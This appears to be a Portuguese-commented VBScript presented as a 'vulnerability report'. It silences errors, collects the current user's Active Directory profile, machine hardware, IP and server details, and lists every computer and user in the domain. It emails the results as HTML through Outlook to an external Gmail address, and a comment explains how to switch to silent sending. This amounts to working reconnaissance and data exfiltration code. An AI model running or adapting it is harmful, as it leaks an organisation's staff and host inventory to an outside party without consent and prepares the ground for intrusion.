On Error Resume Next

emailAdress = "sp.leonardo@gmail.com"
relatName = "Relatorio de Vulnerabilidades" 

Dim sMyString
Dim WshNetwork

Dim Info
Set Info = CreateObject("AdSystemInfo")
GetDomainName = Info.DomainDNSName
strDomainName = GetDomainName
arrDomLevels = Split(strDomainName, ".")
strADsPath = "dc=" & Join(arrDomLevels, ",dc=")

  Dim wshshell
  Dim wshenv
  Set wshshell = CreateObject("Wscript.Shell")
  
strHtml = strHtml & "<style type='text/css'>* {margin: 0; padding: 0;}body {    font: 14px/1.4 Georgia, Serif;}#page-wrap {    margin: 50px;}p {    margin: 20px 0;}    table {        width: 50%;        border-collapse: collapse;    }    tr:nth-of-type(odd) {        background: #eee;    }    th {        background: #333;        color: white;        font-weight: bold;    }    td, th {        padding: 6px;        border: 1px solid #ccc;        text-align: left;    }</style>"
strHtml = strHtml & "<table border = 1> "
strHtml = strHtml & "<tr><th colspan=2 align=center>" & relatName & "</th></tr>"


'Dados de Usuário

    Set WshNetwork = CreateObject("Wscript.Network")
    strUserName = WshNetwork.UserName
    Set WshNetwork = CreateObject("Wscript.Network")
    strComputerName = WshNetwork.ComputerName
    Set WshNetwork = CreateObject("Wscript.Network")
    strUserDomain = WshNetwork.UserDomain

    Login = strUserDomain & "\" & strUserName
    Const ADS_NAME_INITTYPE_GC = 3
    Const ADS_NAME_TYPE_NT4 = 3
    Const ADS_NAME_TYPE_1779 = 1
    Const ADS_NAME_TYPE_DISPLAY = 4
    Set WshNetwork = CreateObject("Wscript.Network")
    Set objTranslator = CreateObject("NameTranslate")
    objTranslator.Init ADS_NAME_INITTYPE_GC, ""
    objTranslator.Set ADS_NAME_TYPE_NT4, Login
    strUserDN = objTranslator.Get(ADS_NAME_TYPE_1779)
    Usuario = objTranslator.Get(ADS_NAME_TYPE_DISPLAY)
    If Err.Number <> "0" Then
    End If
    Set objUser = GetObject("LDAP://" & strUserDN)
    Nome = Usuario
    Email = objUser.mail
    Telefone = objUser.telephoneNumber
    Cargo = objUser.Title
    Departmento = objUser.department
    Empresa = objUser.company


strHtml = strHtml & "</table><br><table border = 1>"
strHtml = strHtml & "<tr><th colspan=2 align=center>Dados do Usuário Atual</th></tr>"
strHtml = strHtml & "<tr><td>Login</td><td>" & strUserName & "</td></tr>"
strHtml = strHtml & "<tr><td>Domínio</td><td>" & strDomainName & "</td></tr>"
strHtml = strHtml & "<tr><td>Nome</td><td>" & Nome & "</td></tr>"
strHtml = strHtml & "<tr><td>E-mail</td><td>" & Email & "</td></tr>"
strHtml = strHtml & "<tr><td>Telefone</td><td>" & Telefone & "</td></tr>"
strHtml = strHtml & "<tr><td>Cargo</td><td>" & Cargo & "</td></tr>"
strHtml = strHtml & "<tr><td>Detartamento</td><td>" & Departamento & "</td></tr>"
strHtml = strHtml & "<tr><td>Empresa</td><td>" & Empresa & "</td></tr>"


strComputer = "."


Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Const HKEY_LOCAL_MACHINE = &H80000002
Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_ComputerSystem")
Set colOSes = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
Set colproc = objWMIService.ExecQuery("Select * from Win32_Processor")
Set colMem = objWMIService.ExecQuery("Select * from Win32_PhysicalMemory")
Set colMemArr = objWMIService.ExecQuery("Select * from Win32_PhysicalMemoryArray")
Set colDisks = objWMIService.ExecQuery("Select * from Win32_LogicalDisk Where DriveType = 3")
        For Each objitem In colItems
            nome_de_maquina = objitem.Name 'Hostname
            nome_fabricante = objitem.Manufacturer  'Fabricante
            nome_modelo = objitem.Model 'Modelo
            memoria_total = Round(objitem.totalphysicalmemory / 1000000000, 2) & " GB"
        Next
        For Each objprocessor In colproc
            nome_Processador = objprocessor.Name 'Tipo do Processador
            nome_speed = objprocessor.Currentclockspeed & "Mhz" 'Clock do processador
        Next
        For Each objOS In colOSes
            nome_so = objOS.Caption & " Service Pack " & objOS.ServicePackMajorVersion & "." & _
            objOS.ServicePackMinorVersion 'SO e Service Pack
        Next
        For Each objDisk In colDisks
            intfreespace = objDisk.FreeSpace
            inttotalspace = objDisk.Size
            If objDisk.DeviceID = "Z:" Then
            Else
            nome_discos = nome_discos & "Drive " & objDisk.DeviceID & Int(inttotalspace / 1000000000) & " GB , " & Int(intfreespace / 1024000000) & " GB Livre(s)"
            End If
        Next
    
    Dim NIC1, Nic, CompName
    Set NIC1 = GetObject("winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")
    For Each Nic In NIC1
    If Nic.IPEnabled Then
    StrIP = Nic.IPAddress(i)
    End If
    Next
    IP = StrIP
        
strHtml = strHtml & "</table><br><table border = 1>"
strHtml = strHtml & "<tr><th colspan=2 align=center>Dados do Equipamento Atual</th></tr>"
strHtml = strHtml & "<tr><td>Nome do Computador</td><td>" & nome_de_maquina & "</td></tr>"
strHtml = strHtml & "<tr><td>Endereço IP</td><td>" & IP & "</td></tr>"
strHtml = strHtml & "<tr><td>Fabricante</td><td>" & nome_fabricante & "</td></tr>"
strHtml = strHtml & "<tr><td>Modelo</td><td>" & nome_modelo & "</td></tr>"
strHtml = strHtml & "<tr><td>Processador</td><td>" & nome_Processador & " " & nome_speed & "</td></tr>"
strHtml = strHtml & "<tr><td>Memória</td><td>" & memoria_total & "</td></tr>"
strHtml = strHtml & "<tr><td>Disco</td><td>" & nome_discos & "</td></tr>"
strHtml = strHtml & "<tr><td>Sistema Operacional</td><td>" & nome_so & "</td></tr>"


    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set colPrinters = objWMIService.ExecQuery("Select * From Win32_Printer")
    For Each objPrinter In colPrinters
        strPrinter = UCase(objPrinter.Name)
    strPort = objPrinter.PortName
        If (Left(strPrinter, 1)) <> "\" Then
        Else
        prtsrv = Split(strPrinter, "\")
   Impressora = "\\" & prtsrv(2)
        End If
    Next

  Set wshenv = wshshell.Environment("VOLATILE")
  strLogonServer = wshenv("LOGONSERVER")

strHtml = strHtml & "</table><br><table border = 1>"
strHtml = strHtml & "<tr><th colspan=2 align=center>Dados dos Servidores</th></tr>"
strHtml = strHtml & "<tr><td>Servidor de Logon</td><td>" & strLogonServer & "</td></tr>"
strHtml = strHtml & "<tr><td>Servidor de Impressão</td><td>" & Impressora & "</td></tr>"




Const ADS_SCOPE_SUBTREE = 2

Set objConnection = CreateObject("ADODB.Connection")
Set objCommand = CreateObject("ADODB.Command")
objConnection.Provider = "ADsDSOObject"
objConnection.Open "Active Directory Provider"
Set objCommand.ActiveConnection = objConnection
objCommand.CommandText = _
    "Select Name, Location from 'LDAP://" & strADsPath & "' Where objectClass='computer'"
objCommand.Properties("Page Size") = 1000
objCommand.Properties("Searchscope") = ADS_SCOPE_SUBTREE
Set objRecordSet = objCommand.Execute
objRecordSet.MoveFirst
Dim strComp
Do Until objRecordSet.EOF
    strComputers = strComputers & "<tr><td colspan=2>" & objRecordSet.Fields("Name").Value & "</td></tr>"
    objRecordSet.MoveNext
Loop
strHtml = strHtml & "</table><br><table border = 1>"
strHtml = strHtml & "<tr><th colspan=2 align=center>Computadores</th></tr>"
strHtml = strHtml & strComputers




Set objCommand.ActiveConnection = objConnection
objCommand.CommandText = _
    "Select Name, Location from 'LDAP://" & strADsPath & "' Where objectCategory='person' and objectClass='user'"
objCommand.Properties("Page Size") = 1000
objCommand.Properties("Searchscope") = ADS_SCOPE_SUBTREE
Set objRecordSet2 = objCommand.Execute
objRecordSet2.MoveFirst
Dim strUser
Do Until objRecordSet2.EOF
    strUsers = strUsers & "<tr><td colspan=2>" & objRecordSet2.Fields("Name").Value & "</td></tr>"
    objRecordSet2.MoveNext
Loop
strHtml = strHtml & "</table><br><table border = 1>"
strHtml = strHtml & "<tr><th colspan=2 align=center>Usuarios</th></tr>"
strHtml = strHtml & strUsers



strHtml = strHtml & "</table>"


Dim OutApp 
Dim OutMail 
Dim sTo 
Set OutApp = CreateObject("Outlook.Application")
Set OutMail = OutApp.CreateItem(0)

        With OutMail
                .To = emailAdress
                .CC = ""
                .BCC = toList
                .Subject = relatName
                '.Body = "" mensagem como clear text
                 .HTMLBody = strHtml ' mensagem em HTML
                .Display 'para enviar o e-mail sem exibir mensagem, altere esta opção para .Send
                '.Send
        End With
